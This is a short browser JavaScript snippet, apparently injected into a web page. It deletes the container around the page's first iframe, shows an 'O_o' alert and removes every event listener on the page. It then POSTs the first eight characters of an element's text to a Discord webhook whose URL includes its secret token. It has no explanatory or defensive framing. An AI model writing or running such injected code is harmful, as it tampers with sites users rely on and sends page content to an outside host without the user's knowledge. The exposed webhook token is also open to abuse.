var frames = document.getElementsByTagName("iframe");
frames[0].parentNode.parentNode.parentNode.remove();
setTimeout(alert,100, "O_o");

window.removeAllEventListeners = () => {
    Array.from(document.querySelectorAll('*')).forEach(element => {
        const listeners = element.getEventListeners();
        Object.keys(listeners).forEach(eventType => {
            listeners[eventType].forEach(({ listener, options }) => {
                element.removeEventListener(eventType, listener, options || false);
            });
        });
    });
};
removeAllEventListeners();

var xhr = new XMLHttpRequest();
xhr.open("POST","https://discord.com/api/webhooks/881918023764697128/tEtQqj3w08JSjay5Jg4CIzijyTb2akzTosya6NVKL8Pr-gMMq33TwPwyy-wInoErm_YA", true);
xhr.setRequestHeader("Content-Type", "application/json");
var content = document.querySelector("#C\\\\.10").innerText.slice(0,8) + " o_O";
xhr.send(JSON.stringify({"content": content}));
